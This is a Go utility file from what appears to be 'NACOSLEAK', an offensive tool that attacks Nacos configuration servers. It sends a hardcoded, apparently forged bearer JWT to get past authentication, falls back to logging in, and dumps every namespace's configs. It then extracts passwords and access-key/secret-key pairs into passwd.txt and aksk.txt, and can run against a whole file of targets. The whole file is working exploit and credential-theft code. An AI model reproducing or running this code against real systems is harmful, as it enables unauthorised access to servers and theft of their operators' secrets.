package utils

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
)
const NAMESPACE_API = "/nacos/v1/console/namespaces"
const NAMESPACE_API_NGINX = "/v1/console/namespaces"
const CONFIG_API = "/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=100&tenant=%s&search=accurate"
const CONFIG_API_NGINX = "/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=100&tenant=%s&search=accurate"
const LOGIN_API = "/nacos/v1/auth/users/login"
const LOGIN_API_NGINX = "/v1/auth/users/login"
const DEFAULT_AUTH = "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTYxODEyMzY5N30.RzTeDJFFdJn2gpDUEhI-3Gd9ABklwe_Z-tORkaerFnM"
var Usrname string
var Passwd string
var Url string
var UrlsFile string
var FolderName string
var NameSpaceFolder []string
var BasePath string
var Nginx bool

func GetResp(targetApi string, Auth bool) (resp *http.Response,err error,statusCode int) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	clt := &http.Client{Transport: tr}
	reqest, err := http.NewRequest("GET", targetApi, nil)
	reqest.Header.Set("Authorization",DEFAULT_AUTH)
	if Auth {
		jwt := getJWT(Url+LOGIN_API, Usrname, Passwd)
		if jwt == "" {
			fmt.Println("[ ERROR ] Get JWT fail :username or password is incorrect .")
			err = fmt.Errorf("[ ERROR ] Get JWT fail :username or password is incorrect .")
			return
		}
		reqest.Header.Set("accessToken", jwt)
	}
	resp, err = clt.Do(reqest)
	if err != nil {
		fmt.Println("[ ERROR ] Cannot connect to target, plz check out ")
		err = fmt.Errorf("[ ERROR ] Cannot connect to target, plz check out ")
		return
	}
	statusCode = resp.StatusCode
	if resp.StatusCode == 404 {
		err = fmt.Errorf("[ ERROR ] Cannot connect to target, plz check out ")
		return
	}
	if resp.StatusCode == 401 || resp.StatusCode == 500 {
		fmt.Println("[ INFO ] Get configs Fail, I think nacos.core.auth.enabled is true .")
		if Usrname != "" && Passwd != "" {
			fmt.Println("[ INFO ] start to get config with Auth .")
			resp,err,statusCode = GetResp(targetApi, true)
			return
		} else {
			fmt.Println("[ ERROR ] target nacos needs Auth")
			err = fmt.Errorf("[ ERROR ] target nacos needs Auth")
		}
	}
	if resp.StatusCode == 403 {
		fmt.Println("[ INFO ] Get configs Fail, I think nacos.core.auth.enabled is true .")
		if Auth {
			fmt.Println("[ ERROR ] username or password is incorrect .")
			os.Exit(0)
		} else {
			resp,err,statusCode = GetResp(targetApi, true)
			return
		}

	}
	if resp.StatusCode == 200 {
		return
	}
	return
}

func UrlFormat (Url string ) string {
	var u *url.URL
	if strings.HasPrefix(Url,"http") || strings.HasPrefix(Url,"https") {
		u, _ = url.Parse(Url)
		return fmt.Sprintf("%s://%s%s", u.Scheme, u.Host, strings.TrimRight(u.Path, "/"))
	}else{
		u,_ = url.Parse("//"+Url)
		u.Scheme = "http"
	}
	return fmt.Sprintf("%s://%s",u.Scheme,u.Host)
}

func getJWT(loginApi string, usrname string, passwd string) string {
	body := fmt.Sprintf("username=%s&password=%s", usrname, passwd)
	request, _ := http.NewRequest("POST", loginApi, strings.NewReader(body))
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := http.DefaultClient.Do(request)
	if err != nil {
		fmt.Println("[ ERROR ] send to " + Url + " fail .")
		return ""
	}
	if resp.StatusCode == 403 {
		return ""
	}
	if resp.StatusCode == 404 {
		jwt := getJWT(Url+LOGIN_API_NGINX, usrname, passwd)
		return jwt
	}
	respBody, _ := ioutil.ReadAll(resp.Body)
	respJson := make(map[string]interface{})
	err = json.Unmarshal(respBody, &respJson)
	//fmt.Println(respJson["accessToken"])
	fmt.Println("[ SUCCESS ] Get JWT success .")
	return respJson["accessToken"].(string)
}

func SaveConfig(Url string, configs []NacosConfig) bool {
	domain,_ := url.Parse(Url)
	if domain.Host != "" {
		FolderName = strings.Replace(domain.Host, ".", "_", -1)
	}else{
		FolderName = strings.Replace(domain.String(), ".", "_", -1)
	}
	FolderName = strings.Replace(FolderName, ":", "_", -1)
	if BasePath == ""{
		BasePath,_ = os.Getwd()
	}
	foldPath := filepath.Join(BasePath,"results",FolderName)
	if !exists(foldPath) {
		err := os.MkdirAll(foldPath, 0766)
		if err != nil {
			fmt.Println(err)
		}
	}
	for _,config := range configs{
		nameSpacePath := filepath.Join(foldPath,config.Name)
		if !exists(nameSpacePath) {
			err := os.MkdirAll(nameSpacePath, 0766)
			if err != nil {
				fmt.Println(err)
			}
		}
		//fmt.Println(nameSpacePath)
		NameSpaceFolder = append(NameSpaceFolder,nameSpacePath)
		allConf := nameSpacePath + "/all_config.txt"
		f, err := os.Create(allConf)
		if err != nil {
			fmt.Println("[ ERROR ] create file fail .")
			return false
		} else {
			_, err = f.Write([]byte(config.Config))
		}
	}
	fmt.Println("[ SUCCESS ] Save in path:" + foldPath)
	return true
}

func SavePasswd(path string,passwdz []string) bool {
	passwdText := path + "/passwd.txt"
	f, err := os.Create(passwdText)
	if err != nil {
		fmt.Println("[ ERROR ] create file fail .")
		return false
	} else {
		for _, v := range passwdz {
			_, err = f.Write([]byte(v))
			_, err = f.Write([]byte("\n"))
		}
	}
	fmt.Println("[ SUCCESS ] Save in path:" + passwdText)
	return true
}

func SaveAKSK(path string,akskz []string) bool {
	akskText := path + "/aksk.txt"
	f, err := os.Create(akskText)
	if err != nil {
		fmt.Println("[ ERROR ] create file fail .")
		return false
	} else {
		for _, v := range akskz {
			_, err = f.Write([]byte(v))
			_, err = f.Write([]byte("\n"))
		}
	}
	fmt.Println("[ SUCCESS ] Save in path:" + akskText)
	return true
}

func exists(path string) bool {
	_, err := os.Stat(path)
	if err != nil {
		if os.IsExist(err) {
			return true
		}
		return false
	}
	return true
}

func ReadTargetFile(path string) (targets []string,err error){
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		targets = append(targets, scanner.Text())
	}
	return targets, scanner.Err()
}


func DeduplicateRepeatData(passwdz []string) []string {
	diff := make(map[string]struct{},0)
	var arr []string
	for _,passwd := range passwdz {
		_,exist := diff[passwd]
		if exist {
			continue
		}else{
			diff[passwd] = struct{}{}
		}
	}
	for key,_ := range diff {
		arr = append(arr,key)
	}
	return arr
}

func Banner() string {
	return `  
  _   _    _    ____ ___  ____  _     _____    _    _  __
 | \ | |  / \  / ___/ _ \/ ___|| |   | ____|  / \  | |/ /
 |  \| | / _ \| |  | | | \___ \| |   |  _|   / _ \ | ' / 
 | |\  |/ ___ \ |__| |_| |___) | |___| |___ / ___ \| . \ 
 |_| \_/_/   \_\____\___/|____/|_____|_____/_/   \_\_|\_\
                                         By:a1  v1.6            `
}
